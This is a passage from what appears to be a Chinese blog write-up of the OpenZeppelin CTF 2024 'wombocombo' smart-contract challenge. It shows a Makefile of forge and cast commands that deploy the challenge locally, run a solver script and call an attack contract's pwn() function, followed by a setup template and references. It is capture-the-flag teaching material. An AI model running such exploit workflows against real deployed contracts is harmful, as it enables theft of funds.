+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">-include</span> .env</span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: solve c-s is-solve tx</span></span><br><span class="line"><span class="section">deploy:; forge script ./script/Deploy.s.sol --rpc-url <span class="variable">$(RPC_URL)</span> --broadcast -vvvv</span></span><br><span class="line"><span class="section">solve:; forge script ./script/Solver.s.sol --rpc-url <span class="variable">$(RPC_URL)</span> --broadcast -vvvv</span></span><br><span class="line"><span class="section">c-s:; cast send <span class="variable">$(ATTACK)</span> &quot;pwn()&quot; --rpc-url <span class="variable">$(RPC_URL)</span> --private-key <span class="variable">$(PLAYER)</span></span></span><br><span class="line"><span class="section">is-solve:; cast send $&#123;CHALLENGE&#125; &quot;isSolved()&quot; --rpc-url <span class="variable">$(RPC_URL)</span> --private-key <span class="variable">$(PLAYER)</span></span></span><br><span class="line"><span class="section">tx:; cast run --rpc-url <span class="variable">$(RPC_URL)</span> $&#123;tx&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>docker 启动后填入对应数据到 <code>.env</code> 文件</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RPC_URL=&lt;docker 生成的 rpc&gt;</span><br><span class="line">PLAYER=&lt;玩家私钥&gt;</span><br><span class="line">CHALLENGE=&lt;挑战地址&gt;</span><br></pre></td></tr></table></figure>
+
+<p>以下为执行命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make solve</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 cast 调用 pwn</span> </span><br><span class="line">make c-s</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>1.<a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/ctf-2024/tree/main">openzeppelin 官方题解</a><br>2.<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Uvd2jlHnoxAaEcJyCy64TQ">ZAN Team writeup</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">Categores</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-number">1.</span> <span class="toc-text">用到的工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA-challenge"><span class="toc-number">2.</span> <span class="toc-text">本地搭建 challenge</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8C"><span class="toc-number">5.</span> <span class="toc-text">本地运行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="toc-number">6.</span> <span class="toc-text">参考文献</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/&text=openzeppelin-ctf-2024-wombocombo"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/&title=openzeppelin-ctf-2024-wombocombo"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/&is_video=false&description=openzeppelin-ctf-2024-wombocombo"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=openzeppelin-ctf-2024-wombocombo&body=Check out this article: https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/&title=openzeppelin-ctf-2024-wombocombo"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/&title=openzeppelin-ctf-2024-wombocombo"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/&title=openzeppelin-ctf-2024-wombocombo"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/&title=openzeppelin-ctf-2024-wombocombo"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/&name=openzeppelin-ctf-2024-wombocombo&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://caronedot.github.io/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/&t=openzeppelin-ctf-2024-wombocombo"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    caronedot
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categores</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
